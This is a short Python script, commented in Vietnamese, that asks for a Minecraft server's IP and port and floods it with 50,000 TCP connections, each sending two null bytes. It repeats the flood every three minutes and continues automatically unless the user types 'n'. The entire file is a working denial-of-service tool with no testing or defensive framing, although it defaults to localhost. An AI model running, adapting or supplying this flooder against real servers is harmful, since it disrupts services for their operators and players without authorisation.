import socket
import threading
import time

DEFAULT_IP = "127.0.0.1"
DEFAULT_PORT = 25565
PACKET_COUNT = 50000
ASK_INTERVAL = 180  # 3 phút
INPUT_TIMEOUT = 5   # 5 giây timeout

def input_with_timeout(prompt, timeout, default=None):
    response = [default]

    def ask():
        try:
            response[0] = input(prompt)
        except:
            pass

    thread = threading.Thread(target=ask)
    thread.daemon = True
    thread.start()
    thread.join(timeout)
    return response[0]

def send_dummy_packet(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect((ip, port))
        sock.sendall(b"\x00\x00")  # Dummy TCP packet
    except:
        pass
    finally:
        sock.close()

def flood_packets(ip, port, count):
    print(f"🔁 Bắt đầu gửi {count} packet tới {ip}:{port}...")
    for i in range(count):
        send_dummy_packet(ip, port)
        if i % 5000 == 0 and i != 0:
            print(f"  ⏩ Đã gửi {i} packet...")
    print("✅ Gửi xong.")

def main():
    print("🔧 Nhập IP và cổng server Minecraft (nhấn Enter để dùng mặc định):")

    ip = input_with_timeout(f"👉 Nhập IP [{DEFAULT_IP}]: ", INPUT_TIMEOUT, DEFAULT_IP)
    port_input = input_with_timeout(f"👉 Nhập cổng [{DEFAULT_PORT}]: ", INPUT_TIMEOUT, str(DEFAULT_PORT))

    try:
        port = int(port_input)
    except ValueError:
        port = DEFAULT_PORT

    print(f"\n🌐 Server: {ip}:{port}\n")

    while True:
        flood_packets(ip, port, PACKET_COUNT)

        print(f"\n⏳ Chờ {ASK_INTERVAL} giây...")
        time.sleep(ASK_INTERVAL)

        print("\n❓ Bạn có muốn tiếp tục gửi packet? (y/n) — Tự động tiếp tục sau 5 giây...")
        ans = input_with_timeout(">>> ", INPUT_TIMEOUT)

        if ans is not None and ans.strip().lower() == 'n':
            print("🛑 Đã chọn dừng. Kết thúc chương trình.")
            break
        else:
            print("⏩ Tiếp tục...\n")

if __name__ == "__main__":
    main()
